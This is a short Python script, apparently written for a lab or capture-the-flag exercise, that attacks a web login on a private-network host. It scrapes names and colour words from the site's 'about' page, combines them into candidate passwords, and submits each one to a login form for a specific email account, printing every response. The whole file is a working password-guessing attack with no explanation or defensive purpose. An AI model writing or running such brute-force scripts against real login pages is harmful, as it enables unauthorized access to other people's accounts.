#!/usr/bin/python3
#headers.py

import requests
from bs4 import BeautifulSoup

url = "http://192.168.234.68:8080/about.html"
response = requests.get(url)

soup = BeautifulSoup(response.text, features="html.parser")
arrName = []
arrColor = []
for elmnt in soup.find_all("td"):
    # print(elmnt)
    linkStr = str(elmnt.string)

    if linkStr[0].islower():
        if linkStr.find("@")==-1:
            if (linkStr not in arrColor):
                arrColor.append(linkStr)
    else:
        if linkStr.find("@")==-1:
            arrName.append(linkStr)


print(arrName)
print(arrColor)


url2 = "http://192.168.234.68:8080/login-3/index.php"
response2 = requests.get(url2)

password=""
for i in arrName:
    for j in arrColor:
        password=i+j.capitalize()+i+j.capitalize()
        info = {"username":"dvaliant@bedlamdynamics.com", "password":password}
        post = requests.post(url2, data = info)
        print(post.text)
        print(password)
        print(arrName.index(i))
        



   
